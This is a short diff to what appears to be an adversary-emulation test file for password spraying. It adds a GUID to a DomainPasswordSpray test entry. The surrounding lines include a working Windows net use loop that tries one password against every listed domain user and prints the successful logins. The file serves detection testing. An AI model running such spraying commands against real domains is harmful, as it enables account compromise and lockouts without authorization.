@@ -34,6 +34,7 @@ atomic_tests:
       @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
 
 - name: Password Spray (DomainPasswordSpray)
+  auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
   description: |
     Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
     
